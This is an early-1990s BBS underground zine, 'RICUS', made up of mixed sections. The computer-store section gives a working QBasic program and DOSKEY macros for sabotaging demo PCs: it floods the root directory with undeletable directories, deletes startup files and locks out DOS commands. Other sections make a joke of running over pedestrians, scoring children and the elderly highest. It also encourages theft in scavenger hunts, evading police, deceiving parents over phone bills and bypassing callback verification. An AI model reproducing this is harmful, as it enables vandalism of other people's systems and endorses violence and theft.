1: Introduction
---------------

   Well! It's time for another issue... We didn't get any feedback on
the last one, except one person said he had fun looking up books at
the library from home. It's always nice to hear some of this stuff 
actually being applied.

   I sometimes wonder if the RICUS name is appropriate any longer.
"Computer Underground" really has very little to do with it as a whole,
it's mostly just miscellaneous ramblings. Ah well.. It's a nice acronym,
anyways.

  By the way, the correct pronunciation of "RICUS" is _not_ "rickus",
but "rye-kus." The accent is in the first syllable, and the "I" is a
long one, not a short one. What's that have to do with anything? Well,
I just had to clarify that...

         
         The Implementor
        
        (yep, I changed the ol' "pen handle" again...
                                ...or is this someone different?)
         

-----------------------------------------------------------------------------
2: Wanted: Souls
----------------

   Ever been really fed up with the concept of "Going to Hell" if you are'ne
a good little doobie?  Perhaps you like the concept of evil but are afraid of
eternal damnation?  Well, whatever your reason for disliking the modern
religious punishment/reward system, I have the solution for you!  Before I
tell you what it is, I'd like to assure you that I am not at all aphiliated
with God, Allah, Satan, Zeus, Tiamat, or any other deity.
   The solution, you ask?  Give me your soul.  Yes, I know, this sounds
rather drastic, but I'm quite serious.  The only reason you don't do all the
things you really want to do is because you're afraid of being punished in
the afterlife.  So, by giving me your soul, you can be assured that no such
afterlife will happen, and therefore no punishment for your actions will
occur after you die.
   Now, many of you will want to know what happens to you after death if you
don't have a soul, right?  Well, its simple.  When you agree to give me your
soul, you won't notice anything.  But, upon death, instead of going to heaven
or hell or wherever, your soul is absorbed into my own, and you quite quietly
and peacefully cease to exist, for all practical purposes.  You just slip into
blissfull oblivion.  Sounds painless enough, does'ne it?  Well its just that
easy.  Also, for those of you who want to live forever or are afraid of the
concept of ceasing to exist, one could view my having your soul as you
existing for as long as I do, as your energy is assimilated by me.
   Why do I want your souls?  True, I have just said that they are bothersome,
but that is only true if you have just one.  Every soul you has when you die
gives you aditional power in the afterlife.  So, while one soul is only enough 
to let you be controlled by the deity which you worship, a few extra lets you
be independant.  And if you get enough souls before dying, you can even get
a bit more power over living things!  So, as you can see, I'm not just being
a hypocrit and trying to trick you out of your souls.  I'm simply trying to
free you from the chains of oppressive deities.

3: BBS Censorship
-----------------

 Information, mostly in the form of textfiles, is the commodity of all of
cyberspace. Usually proclaimed "illegal" on the larger, professional BBSes,
such information only turns up on the relatively small boards.

 RICUS has obtained some amusing captures from one of the states larger
psuedo-professional BBSes, concerning the uploading of such text files:

 Names have been blotted out to protect both the innocent and guilty.

   I reveiwed the file and don't know what you were thinking when you
   uploaded it... The following it the first few lines of the file...

With recent events on the board that resulted in your being placed on a
probationary status I would have thought you would be more careful.
Please make sure you are familiar with the files you are uploading.

Files promoting illegal and/or dangerous activities are NOT
acceptable!! (Consider this message an official warning.)

<Gasp!> God forbid someone upload a textfile! Did you know you can find
such dangerous information is virtually any library?

 Might text files be more interesting than dozens of CD-ROMS full of old,
dysfunctional, mostly useless shareware?

If you examine the top of this file, you'll find it reads:

 Infact, this file was posted INTERNATIONALLY on a network (Usenet), where it
was initially taken from. It is, by no means, illegal.

 Well, <a cosysop>, if you ever read this, he was probably thinking of
attracting your attention when he uploaded it, and that's exactly what you
gave him.

4: Computer Store Abuse
-----------------------

 Have you ever walked into a Rat Shack or other computer store, looking for
something you know they probably won't have?

 The dozens of computers before you present an excellent opportunity for 
sabotage. If you are creative, you should have discovered this for yourself.
If you are not, here are some things you can do:
 
 BTW, make sure the sales dude is busy, since you don't want those fools 
coming over and bothering you. Now, I will assume you are abusing a MS-DOS
machine, hopefully a 386 or higher with a large hard drive.

 First, most likely the machine will be running some awful Windows or Prodigy
demo. See if you can exit to DOS. If an Exit-to-DOS option isn't clear, reboot
the computer with Alt-Ctrl-Del or hit the reset button. It looks suspicious
to actually flip switches, so try to avoid it. Now, hold down Ctrl-Break
as soon as the damn thing's done with the memory test. You should be in DOS.
 
 If you are not, they probably have some Ctrl-Break handler installed in
config.sys to prevent sabotage. This will be highly unlikely, of course, but
it's always possible. If this is the case, simply move to another machine.

 Now, on to the actual sabotage.
 
 Firstly, you could format the HD outright. I wouldn't advise this. It is
not my style.
 
 I'd much rather create annoying directories on their hard disk. First off,
go into QBasic or whatever BASIC happens to be on their HD.

 Enter the following BASIC program:

10 chdir "\"
20 for i = 1 to 300
30 dirname$=""
40 for x=1 to 8
50 dirname$=dirname$+chr$((rnd(1)*39)+179)
60 next x
70 print "Making Directory";dirname$
80 mkdir dirname$
90 next i

What does that do? It'll make up to 300 directories on their hard drives
root dir. They won't be able to delete them with the normal DOS RD command.
The directories will be made out of IBM extended ASCII line characters.

To see what the program does, set up a RAM drive or something and run it
on that drive. 

Note that DOS will probably hit it's root dir limit before directory 300.
If you want more directories, DELete AUTOEXEC.BAT and CONFIG.SYS. Then run
the program again. (Use basic SHELL to shell to DOS...) Now, they're little
demo won't run anymore when the computer reboots. Also, they won't be able to
make a new CONFIG.SYS or AUTOEXEC.BAT because you've filled up their root
directory with those hard-to-delete special directories. For a good laugh,
do a DIR after you run the program! It looks really funny!

I set up a RAM drive on one of my computers to test it out. Here's what the
root dir looks like after I ran the program with QuickBasic:

 Volume in drive G is MS-RAMDRIVE
 Directory of G:\

¥é√æŸ“Œ√     <DIR>     05-17-93   8:45p
∂∑¿∏≥»Õ»     <DIR>     05-17-93   8:45p
∑∫∂éÿ»∆Ÿ     <DIR>     05-17-93   8:45p
               .
               . [etc...]
               .
ÿ∑ŸÃ ô…Ω     <DIR>     05-17-93   8:45p
Ÿ’ œπΩ¥”     <DIR>     05-17-93   8:45p
⁄Ω∫Œ¥¿Œ∑     <DIR>     05-17-93   8:45p
       63 file(s)          0 bytes
                       30208 bytes free

Disgusting, isn't it?

 Other forms of creative sabotage are also available. First, find out what
version of DOS they are running. It'll probably be version 5 or 6 by now. Now,
find out what dir their DOS directory is. It's probably C:\DOS or something.

 Edit the AUTOEXEC.BAT. Makesure it runs DOSKEY (found in the DOS dir, so
add something like C:\DOS\DOSKEY if they're not already running it.) Doskey
is the MS-DOS macro program. Also, makesure the DOS dir is in their path...

Now, at the end of the AUTOEXEC.BAT, add the following lines:

doskey dir=cls
doskey cd=cls
doskey help=cls
doskey edit=cls
doskey ver=cls
doskey md=cls
doskey mkdir=cls
doskey format=cls
doskey del=cls
doskey erase=cls

[etc... etc...
add "doskey (any command you want to blank out)=cls" until you've
locked out all the commands you want... ]
doskey doskey=cls

You are effectively locking out any DOS command and changing it to CLS. This
is truly horrible, since the computers DOS will appear non-functional! Also,
why not take the demo or whatever out of the autoexec.bat while you're at
it... Doskey is changed to CLS at the end so they can't disable your macros.
Of course, they could control-break the autoexec.bat, but there's not much you
can do about that.

 Well, that concludes this installment of computer store system sabotage. Have
fun, and if you get caught doing it tell them you were just fooling around.

5: CLAN Info Update
-------------------

 This is a list of CLAN library identifiers and logins for
the CLAN systems. Take a look at the last issue of RICUS issue 2.02,
for complete info on CLAN, the RI library network.

  Also, there is another CLAN dialup at (401) 521-4464.

  This dialup supports 2400 bps w/MNP, and is preferable to the one
given in the last RICUS.

   **** Thanks to Lord Soth for contributing the following list ****

6: List of Equal Access Codes
-----------------------------

 There's 100s of long distance companies out there for you to use.
 
 Most people are signed up for AT&T, MCI, Sprint, or something else as their
default carrier. You can, however, select other carriers.

 Here's how:
 
 Dial 10xxx+1+ACN
 
 xxx is the 3 digit equal access code.
 ACN is the area code+number of the place you're calling.
 
 You can also you 10xxx+0+ACN for "operator assisted" dialing.
 
 Ever wanted a list of all the long distance equal access codes?

 Sheesh!! There's a lot of LD companies out there...
 
 Please note that you will not be able to use some of these carriers. Many
carriers will refuse to put calls through from numbers that have not signed
up for their service.
 
 Note that making a call through another LD carrier, instead of your default
one, will probably delay the bill by many months. This has it's uses -- since
it'll be easier to convince your parents that you never made that call, etc.

7: Driving
----------
Has this ever happened to you?

You're driving down the street minding your own business when an idiot or
several idiots jump out in front of your car and almost cause you to get into
an accident...

Well fear no more!  Now, yes NOW, you have a REASON not to swerve out of the
way...

What is this reason?  Is it some Carte Blanche or Diplomatic Immunity?
Nope, nothing like that.  You can still be prosecuted to the fullest extent of
the law as of right now for vehicular homicide, but hey what's a little fun
every once in awhile...  And now I give to the Great American Masses:

                   The UNOFFICIAL Pedestrian Scoring Sheet

Toddlers / Children                                     70 points
  (Any child 0-12 years of age, any sex)
Teenagers                                               40 points
  (Any child 13-19 years of age, any sex)
Adult Men                                               5 points
  (Any male between the ages of 20-39)
Mature Men                                              15 points
  (Any male between the ages of 40-74)
Adult Women                                             10 points
  (Any female between the ages of 20-39)
Mature Women                                            30 points
  (Any female between the ages of 40-74)
Elderly                                                 100 points
  (Any person over 75 years of age, any sex)


Just a few other points worth mentioning:

1> The age is an approximation of the individual.  If questions arise, a guess
   is fine.  Do NOT get out of the car to ask for their age (don't be stupid),
   just drive on.

2> The race of a person is irrelevant.  This is not an exercise in bigotry,
   just good, clean fun!

3> Points will only be given for clean kills.  No near hits.  No slightly
   wounded or grazed, just street pizzas.

4> We have intentionally left out animals for sake of simplicity.  It seems
   that everybody has their own opinion of what is worth what based on their
   opinion.  We feel that a flat rate would be fine in most cases, but others
   disagree.  An update will be posted (You can sure see a lot of critters out
   on the roads after midnight) if there is enough interest, but for now it is
   up to the individual how animals would / should be scored.

5> Very Important Idiots should be worth approximately 2 to 3 times normal
   point values.  Once again, debate over as to who should qualify as to who
   exactly should be worth more.  As point 4, any interest will generate an
   update to the scoring sheet.  (NOTE:  It has been STRONGLY AGREED ON that
   all religious figures should be worth AT LEAST double point value).

6> Also, it seems that some drivers enjoy just opening car doors in the path
   of traffic.  At this point there is no point value assigned to obstacles
   and other stationary targets, for they lack the challenge of a moving
   target, but as in points 4 and 5, you may never know what may happen in the
   future...


    That should just about wrap up this edition of the UNOFFICIAL Pedestrian
    Scoring Sheet, but stay tuned in future editions of RICUS for possible
    updates.  Any suggestions, comments, and related ilk should be presented
    in the correct circles...

This article was made possible by the makers of one of the best B-budget
movies of all time: Deathrace 2000.  Although the scoring system was brief,
and in many cases, contradictory during the movie. The scoring system was
extrapolated upon by Three-D and presented in this form as of the time of this
writing.  Plans are under way in order to bring you more, but interest will
determine whether or not these updates will be made available to the general
public...

[Editor's Note: RICUS in no way condones the transformation of innocent 
pedestrians into "street pizzas." This article was presented for your personal
amusement and in the interest of free expression. RICUS will not take any
responsibility for psychotic acts committed because of it. ]

8: Scanvenger Hunt
------------------

When I was still in high school, my cousin managed to get involved in the
midnight scavenger hunts that were all the rage back in the mid 1980s.  You
know, the fun ones that occur between midnight and some pre-determined time
usually a bit after sunrise.  The ones in which you had to find a bunch of
hard-to-acquire to near-impossible-to-acquire items for a given point value.
Well, since you were allowed a group of X ammount of people I was given the
oppourtunity to partake in this adolesent ritual and found it to be one of the
more creative nights of my life. (It definately takes some creativity in order
to get some of these things). Now I give to you:

                The 1993 Unofficial Scavener Hunt Basics
                ----------------------------------------

             (Since there probably is one going on secretly
            somewhere now that the weather is getting better
                              and better).


Rules are simple:

1> DON'T get caught.
2> Find item, get item, bring item to scoring area, get points for item.
3> No telling cops where the scoring area is or who is involved (duh!).
   (Many a low scoring night were possible due to increased cop activity).
4> I have seen teams go from individuals, a given ammount of people, and
   complete free-for-alls.  Organizers discression.
5> Don't get caught.
7> Have FUN!
8> Don't get caught.

Okay, now that the basics are defined.  It goes without saying that some form
of transport is recommended.  Hatchbacks are a good choice, but pickups and
vans seem to be the choice of the serious, die-hard scavengers...

Now a scavenger hunt wouldn't be any kind of fun if it weren't for the list.
For those of you who never did this or haven't a clue, there was a copy of the
list given to each team just before the start of the event, items changed
frequently to avoid pre-event shopping.  They were ususally sealed in
envelopes for those times when (god help you) the cops were wondering what
you were doing with a trck full of stuff.  Wandering eyes are always deadly in
these situations, and a found list were usually the bane of the entire night.
Anyways, here is just a sample list:

Road/Street Signs                                       Point Value

This is NOT by any means a complete list.  For sake of space, just a sample of
items were selected to make it to the list for a flavor of the sport. There are
literally MILLIONS of items that can be added or taken away.  Fun is the key
word in selecting items for the list.

NOTE:  The list changes in size and content on complete whims of the creators
as well as the point values of items, depending heavily on supply and demand
as well as hundreds of other factors.  Point values are generally determined
by their availability and the effort put into obtaining the object.


Also worth mentionning that when this file was undergoing the
creation/planning stage I received a copy of the ANUS01 text file.
Unfortunately, this was also a scavenger hunt file (called the ANUS Benefit
Preferred Theft List) but still the same idea.  Anyways, I felt that a How-to
file would be a little bit better since you are only young once so what the
hell..

This file is created in the memory of G. Boudreau, and his fun bunch of
friends: "Shadow" , Steve ("just Steve"), and a myriad of others who exposed
my cousin and I to the idea of the scavenger hunt with a myriad of stories of
their exploits in this summertime excursions when we were very young and very
impressionable.  Without his help, we'd probably be just normal, boring kids,
but thanks to his efforts we learned that life is a lot more interesting when
the rules were bent and/or fractured occasionally...

Also, for those who are interested in a complete list as well as excerpts from
ACTUAL lists from the 60s to the 80s drop a line to the appropriate people.
Advanced planning hints, strategies, etc. will be available to interested
parties...

9: Closing
----------
    
  You know, we'd actually enjoy some articles from those old sysops who
probably hate us, even though half of them were just like us about a decade
ago. Just send em up to your nets.. or in E-Mail. You know who to send it to.

  Special thanks to all the contributors! Thanks, guys!
   
      The Implementor
  
PS: If you really don't know, just send it up in NE-Net Common or Fido-323,
addressed to "Those RICUS Guyz"! It looks really funny, and pisses people off.
If you want anonymity, make a fake account on a board with one of the above
nets. Plenty of systems still have the Call Back Verifier bug.
Read RICUS201.TXT if you don't know how to bypass CBVs!
